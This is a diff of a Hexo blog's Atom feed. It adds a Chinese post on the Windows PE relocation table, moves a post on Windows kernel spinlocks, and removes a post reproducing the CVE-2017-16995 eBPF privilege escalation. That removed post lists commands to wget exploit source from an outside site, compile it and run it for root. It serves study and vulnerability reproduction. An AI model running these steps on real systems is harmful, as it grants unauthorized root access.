@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-05-11T06:00:30.638Z</updated>
+  <updated>2018-05-14T06:22:53.401Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>《windows PE》重定位表</title>
+    <link href="http://yoursite.com/2018/05/14/%E3%80%8Awindows%20PE%E3%80%8B%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/"/>
+    <id>http://yoursite.com/2018/05/14/《windows PE》重定位表/</id>
+    <published>2018-05-14T06:02:11.000Z</published>
+    <updated>2018-05-14T06:22:53.401Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="预备知识：代码重定位"><a href="#预备知识：代码重定位" class="headerlink" title="预备知识：代码重定位"></a>预备知识：代码重定位</h1><h2 id="重定位的提出"><a href="#重定位的提出" class="headerlink" title="重定位的提出"></a>重定位的提出</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码重定位是把可执行代码从内存的一块区域移动到另外一块地方。但是如果指令中某些操作数没有随着地址的改变而改变，这样势必导致运行出错。如下代码：我们发现全局变量的地址包含在机器码中，而局部变量没有包含绝对地址。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">esp</span>,ffffffc</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [00400FFC]   //全局变量</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">04</span>]     //局部变量</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [evp+<span class="number">08</span>]     //局部变量</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位信息是在编译时期由编译器生成，并且保存在应用程序中，在程序执行的时候由操作系统予以修正。如果在装载时该位置已经被别的应用程序使用，操作系统会<strong>重新选择一个新的基地址</strong>。此时，就需要对所有重定位信息进行纠正，纠正的依据就是<strong>PE中的重定位表</strong>。</p><h1 id="PE文件中的重定位表"><a href="#PE文件中的重定位表" class="headerlink" title="PE文件中的重定位表"></a>PE文件中的重定位表</h1><h2 id="1-重定位表的定位"><a href="#1-重定位表的定位" class="headerlink" title="1.重定位表的定位"></a>1.重定位表的定位</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表位于数据目录中的第六个数据目录中。位置定位方法和前面的导入表和导出表一样。<br>    <img src="https://i.imgur.com/UqrSU1r.png" alt=""></p><h2 id="2-重定位表项IMAGE-BASE-RELOCATION"><a href="#2-重定位表项IMAGE-BASE-RELOCATION" class="headerlink" title="2.重定位表项IMAGE_BASE_RELOCATION"></a>2.重定位表项IMAGE_BASE_RELOCATION</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和导入表一样，重定位表指针指向的位置是一个数组。<strong>每个数组代表的是每一个内存页的重定位信息。</strong>也就是说每个内存页的重定位信息是不同的。下面是对于IMAGE_BASE_RELOCATION结构体的介绍:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">IMAGE_BASE_RELOCATION STRUC 【基址重定位位于数据目录表的第六项，共<span class="number">8</span>+N字节】</div><div class="line">&#123;</div><div class="line">+<span class="number">00</span> h DWORD VirtualAddress ;重定位数据开始的RVA 地址</div><div class="line">+<span class="number">04</span> h DWORD SizeOfBlock ;重定位块得长度，标识重定向字段个数</div><div class="line">+<span class="number">08</span> h WORD TypeOffset ;重定项位数组相对虚拟RVA,个数动态分配</div><div class="line">&#125;;</div><div class="line">IMAGE_BASE_RELOCATION ENDS</div></pre></td></tr></table></figure></p><ul><li>VirtualAddress:双字，表示的是重定位块的RVA。<strong>本来一个地址需要4个字节，因为一个内存页大小诶1000h,也就是2的12次，所以只需要2个字节即可</strong></li><li>SizeOfBlock：双字，重定位表项中的重定位块的个数。这些数组(表项)可能不是相邻的。</li><li>TypeOffset：表示重定位表项的类型：高四位表示的是类型。低十二位表示的重定位地址。<br>  <img src="https://i.imgur.com/QjFxUnO.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位块的大小：n*12+4+4</li></ul><h2 id="3-重定位表的结构"><a href="#3-重定位表的结构" class="headerlink" title="3.重定位表的结构"></a>3.重定位表的结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表中包含有重定位块，重定位块中包含有重定位表项和前面的VirtualAddress，SizeOfBlock，TypeOffset字段。<br>    <img src="https://i.imgur.com/4pZ0mvd.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有的重定位块最终以VirtualAddress字段为0的IMAGE_BASE_RELOCATION结构为结束标志。</p><h2 id="4-实例分析"><a href="#4-实例分析" class="headerlink" title="4.实例分析"></a>4.实例分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下图，我们知道第一个重定位块位于0x1c00，代码起始页面RVA为00001000，块的大小为000000E8。后面的是每个重定位表项的相对位置。根据以下计算公式得到最终的实际地址。<br>VA=基地址(程序基地址)+代码起始页面RVA+<strong>低12位虚拟地址。</strong><br>VA=01000000+00001000+009<br>    <img src="https://i.imgur.com/tLuBjY9.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;预备知识：代码重定位&quot;&gt;&lt;a href=&quot;#预备知识：代码重定位&quot; class=&quot;headerlink&quot; title=&quot;预备知识：代码重定位&quot;&gt;&lt;/a&gt;预备知识：代码重定位&lt;/h1&gt;&lt;h2 id=&quot;重定位的提出&quot;&gt;&lt;a href=&quot;#重定位的提出&quot; class=&quot;
+      
+    
+    </summary>
+    
+      <category term="windows PE" scheme="http://yoursite.com/categories/windows-PE/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>《windows PE》导出表</title>
@@ -290,29 +313,6 @@
   </entry>
   
   <entry>
-    <title>第三章：系统机制-同步</title>
-    <link href="http://yoursite.com/2018/04/08/%E3%80%8AWindows%20Internals%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%90%8C%E6%AD%A5/"/>
-    <id>http://yoursite.com/2018/04/08/《Windows Internals》第三章_同步/</id>
-    <published>2018-04-08T07:02:11.000Z</published>
-    <updated>2018-04-09T04:44:36.758Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="3-3-同步"><a href="#3-3-同步" class="headerlink" title="3.3 同步"></a>3.3 同步</h1><h2 id="高IRQL的同步"><a href="#高IRQL的同步" class="headerlink" title="高IRQL的同步"></a>高IRQL的同步</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在内核执行的各个阶段，内核必须保证在临界区中同一时刻只有一个处理器在执行，内核必须保证所有线程按照互斥的方法访问这些数据（内核临界区）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于中断的发生，该中断的处理例程需要修改一个全局的数据结构，与此同时，内核恰好在更新该数据结构，违背了互斥的原则（同一时间只有一个处理器访问数据结构）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows采用了一个比较复杂的方法：首先内核先将处理器的IRQL(中断请求级别)提高到能访问该数据结构的最高的级别，这样就屏蔽了在中断处理例程中使用该资源的中断。<strong>但是这种策略对于单处理器来说是可以的，但是不能阻止多处理器发生中断。</strong> </p><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内核用来实现多处理器互斥的机制是自旋锁。自旋锁是一个与某个局部变量相关联的锁原语，在进入临界区之前，内核（处理器）会一直尝试获取相关联的自旋锁，直到成功为止。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自旋锁是通过硬件支持的test-and-set操作来实现的，也即：在一条原子指令内测试并获取锁，这样避免多线对锁的争夺。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每一个自旋锁都拥有一个IRQL，并且这个IRQL总是在DPC/Dispatch或者更高级别，因为这个原因，如果一个线程拥有自旋锁，则他永远不会被抢占。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任何一个试图获取自旋锁的处理器本质上都是处于忙等状态。<strong>因为处理器在进入临界区之前会循环的去获取自旋锁</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用pause汇编指令，插入到忙等的循环中，这条指令告诉处理器他正在执行的部分是自旋锁的获取循环部分。  </p><h2 id="排队的自旋锁"><a href="#排队的自旋锁" class="headerlink" title="排队的自旋锁"></a>排队的自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当一个处理器想要获取被其他处理器持有的自旋锁的时候，他会把自己的标志符放在与该自旋锁关联的队列中，如果当前正持有自旋锁的处理器释放的，则其将自旋锁移交给队列的第一个处理器，如果处理器正在等待一个忙着的自旋锁，他会检查处于该处理器之前的处理器的标志，<strong>而不是检查自旋锁的标志</strong>。<strong>说是排队的自旋锁，还不如说是排队等待自旋锁的处理器</strong>。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;锁是留给内核使用的，所以，在设备驱动程序中获取这些排队的自旋锁是不被支持的。</p><h2 id="栈内排队的自旋锁"><a href="#栈内排队的自旋锁" class="headerlink" title="栈内排队的自旋锁"></a>栈内排队的自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自旋锁句柄是一个数据结构。包含了<strong>锁的所有权</strong>（要求局部变量的原因所在）和处理器队列等状态信息，由此，<strong>句柄不应该是一个全局变量，往往是一个栈变量，以保证调用线程的局部性。</strong></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;3-3-同步&quot;&gt;&lt;a href=&quot;#3-3-同步&quot; class=&quot;headerlink&quot; title=&quot;3.3 同步&quot;&gt;&lt;/a&gt;3.3 同步&lt;/h1&gt;&lt;h2 id=&quot;高IRQL的同步&quot;&gt;&lt;a href=&quot;#高IRQL的同步&quot; class=&quot;headerlink&quot; 
-      
-    
-    </summary>
-    
-      <category term="windows系统" scheme="http://yoursite.com/categories/windows%E7%B3%BB%E7%BB%9F/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>C++Primer 第五章：语句</title>
     <link href="http://yoursite.com/2018/04/08/C++%E7%AC%AC%E4%BA%94%E7%AB%A0_%E8%AF%AD%E5%8F%A5/"/>
     <id>http://yoursite.com/2018/04/08/C++第五章_语句/</id>
@@ -333,6 +333,29 @@
     </summary>
     
       <category term="C++" scheme="http://yoursite.com/categories/C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>第三章：系统机制-同步</title>
+    <link href="http://yoursite.com/2018/04/08/%E3%80%8AWindows%20Internals%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%90%8C%E6%AD%A5/"/>
+    <id>http://yoursite.com/2018/04/08/《Windows Internals》第三章_同步/</id>
+    <published>2018-04-08T07:02:11.000Z</published>
+    <updated>2018-04-09T04:44:36.758Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="3-3-同步"><a href="#3-3-同步" class="headerlink" title="3.3 同步"></a>3.3 同步</h1><h2 id="高IRQL的同步"><a href="#高IRQL的同步" class="headerlink" title="高IRQL的同步"></a>高IRQL的同步</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在内核执行的各个阶段，内核必须保证在临界区中同一时刻只有一个处理器在执行，内核必须保证所有线程按照互斥的方法访问这些数据（内核临界区）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于中断的发生，该中断的处理例程需要修改一个全局的数据结构，与此同时，内核恰好在更新该数据结构，违背了互斥的原则（同一时间只有一个处理器访问数据结构）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows采用了一个比较复杂的方法：首先内核先将处理器的IRQL(中断请求级别)提高到能访问该数据结构的最高的级别，这样就屏蔽了在中断处理例程中使用该资源的中断。<strong>但是这种策略对于单处理器来说是可以的，但是不能阻止多处理器发生中断。</strong> </p><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内核用来实现多处理器互斥的机制是自旋锁。自旋锁是一个与某个局部变量相关联的锁原语，在进入临界区之前，内核（处理器）会一直尝试获取相关联的自旋锁，直到成功为止。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自旋锁是通过硬件支持的test-and-set操作来实现的，也即：在一条原子指令内测试并获取锁，这样避免多线对锁的争夺。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每一个自旋锁都拥有一个IRQL，并且这个IRQL总是在DPC/Dispatch或者更高级别，因为这个原因，如果一个线程拥有自旋锁，则他永远不会被抢占。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任何一个试图获取自旋锁的处理器本质上都是处于忙等状态。<strong>因为处理器在进入临界区之前会循环的去获取自旋锁</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用pause汇编指令，插入到忙等的循环中，这条指令告诉处理器他正在执行的部分是自旋锁的获取循环部分。  </p><h2 id="排队的自旋锁"><a href="#排队的自旋锁" class="headerlink" title="排队的自旋锁"></a>排队的自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当一个处理器想要获取被其他处理器持有的自旋锁的时候，他会把自己的标志符放在与该自旋锁关联的队列中，如果当前正持有自旋锁的处理器释放的，则其将自旋锁移交给队列的第一个处理器，如果处理器正在等待一个忙着的自旋锁，他会检查处于该处理器之前的处理器的标志，<strong>而不是检查自旋锁的标志</strong>。<strong>说是排队的自旋锁，还不如说是排队等待自旋锁的处理器</strong>。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;锁是留给内核使用的，所以，在设备驱动程序中获取这些排队的自旋锁是不被支持的。</p><h2 id="栈内排队的自旋锁"><a href="#栈内排队的自旋锁" class="headerlink" title="栈内排队的自旋锁"></a>栈内排队的自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自旋锁句柄是一个数据结构。包含了<strong>锁的所有权</strong>（要求局部变量的原因所在）和处理器队列等状态信息，由此，<strong>句柄不应该是一个全局变量，往往是一个栈变量，以保证调用线程的局部性。</strong></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;3-3-同步&quot;&gt;&lt;a href=&quot;#3-3-同步&quot; class=&quot;headerlink&quot; title=&quot;3.3 同步&quot;&gt;&lt;/a&gt;3.3 同步&lt;/h1&gt;&lt;h2 id=&quot;高IRQL的同步&quot;&gt;&lt;a href=&quot;#高IRQL的同步&quot; class=&quot;headerlink&quot; 
+      
+    
+    </summary>
+    
+      <category term="windows系统" scheme="http://yoursite.com/categories/windows%E7%B3%BB%E7%BB%9F/"/>
     
     
   </entry>
@@ -443,29 +466,6 @@
 &lt;li&gt;2.行为分析&lt;/li&gt;
 &lt;li&gt;3.样本分析&lt;/li&gt;
 &lt;li&gt;4.详细分析
-    
-    </summary>
-    
-      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2017-16995本地提权漏洞复现</title>
-    <link href="http://yoursite.com/2018/03/23/CVE-2017-16995%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://yoursite.com/2018/03/23/CVE-2017-16995本地提权漏洞复现/</id>
-    <published>2018-03-23T09:02:11.000Z</published>
-    <updated>2018-03-23T05:58:30.401Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h1><p>Ubuntu最新版本16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 </p><p>攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。该漏洞编号是CVE-2017-16995，在之前的一些老版本已经修复了，但是在最新的Ubuntu版本中，又出现了这个漏洞，并且Twitter爆出了漏洞利用代码……</p><p>目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。</p><p>影响版本：<br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04<br><a id="more"></a></p><h1 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h1><ul><li><p>1）查看Ubuntu版本，Ubuntu16.04</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -<span class="keyword">a</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/LJRX3Bg.png" alt=""></p></li><li><p>2) 查看本地用户组权限,系统处于用户登录状态</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">id</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/ulpa44S.png" alt=""></p></li><li><p>3）下载PWN代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget  http:<span class="regexp">//</span>cyseclabs.com<span class="regexp">/pub/u</span>pstream44.c</div></pre></td></tr></table></figure></li><li><p>4) 安装gcc编译器</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt <span class="keyword">install</span> gcc</div></pre></td></tr></table></figure></li><li><p>5) 编译.C源文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -o <span class="built_in">test</span> upstream44.c</div></pre></td></tr></table></figure></li><li><p>6) 赋予可执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x <span class="built_in">test</span></div></pre></td></tr></table></figure></li><li><p>7) 查看刚刚操作是否成功生成test文件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">ll</span></div></pre></td></tr></table></figure></li><li><p>8) 执行刚刚编译出来的文件,发现程序执行了本地提权操作（没有经过密码认证从而获取管理员权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./<span class="built_in">test</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/HpdwJrB.png" alt=""></p></li></ul><h1 id="3-原理分析"><a href="#3-原理分析" class="headerlink" title="3.原理分析"></a>3.原理分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞发生的具体原因是：在linux内核中的kernel/bpf/verifier.c中的check_alu_op函数通过4.14.8允许本地用户通过利用不正确的符号扩展来导致拒绝服务（内存损坏）或可能具有未指定的其他影响。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eBPF可用于内核调试和跟踪，网络事件的过滤，其一般机制是：  </p><ul><li>1）用户空间将一个特殊的汇编字节码加载到内核，并且说明附加程序的位置  </li><li>2) 内核运行一个BSP验证器来证明程序是安全的  </li><li>3）内核将字节码转化为本地代码，并将其附加到请求的位置。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eBPF验证器会检查eBPF程序是否符合某些要求：  </li><li>1）它限制了字节码指令的数量  </li><li>2）循环被禁止  </li><li>3）确保没有不可达的说明  </li><li>4）确保没有跳出界限  </li><li>5）确保只有授权区域才能访问内存  </li><li>6）等等。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果验证者通过了一个恶意程序，它会使整个系统面临很大的风险，这是由于eBPF在内核中运行的事实 - 将本该安全执行的内容转变为内核中的任意代码执行。具体来说，在这种情况下，验证者无法验证对内存的访问权限，从而允许读写任意内核地址！  </li></ul><h1 id="4-参考文献"><a href="#4-参考文献" class="headerlink" title="4.参考文献"></a>4.参考文献</h1><p><a href="https://mp.weixin.qq.com/s/h_5LzJafkOJCcLqQAcIuHQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/h_5LzJafkOJCcLqQAcIuHQ</a><br><a href="https://blog.csdn.net/zhao_cancan/article/details/38366541" target="_blank" rel="external">https://blog.csdn.net/zhao_cancan/article/details/38366541</a><br><a href="https://blog.csdn.net/bai___ddd/article/details/79105754" target="_blank" rel="external">https://blog.csdn.net/bai___ddd/article/details/79105754</a><br><a href="https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor?spm=a2c4e.11155515.0.0.p3m7Ql&amp;utmcampaign=General%20website&amp;utmcontent=67375488&amp;utmmedium=social&amp;utmsource=twitter" target="_blank" rel="external">https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor?spm=a2c4e.11155515.0.0.p3m7Ql&amp;utmcampaign=General%20website&amp;utmcontent=67375488&amp;utmmedium=social&amp;utmsource=twitter</a>  </p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.漏洞概述&quot;&gt;&lt;/a&gt;1.漏洞概述&lt;/h1&gt;&lt;p&gt;Ubuntu最新版本16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 &lt;/p&gt;
-&lt;p&gt;攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。该漏洞编号是CVE-2017-16995，在之前的一些老版本已经修复了，但是在最新的Ubuntu版本中，又出现了这个漏洞，并且Twitter爆出了漏洞利用代码……&lt;/p&gt;
-&lt;p&gt;目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。&lt;/p&gt;
-&lt;p&gt;影响版本：&lt;br&gt;Linux内核：Linux Kernel Version 4.14 ~ 4.4&lt;br&gt;Ubuntu版本：16.04.01~ 16.04.04&lt;br&gt;
     
     </summary>
     
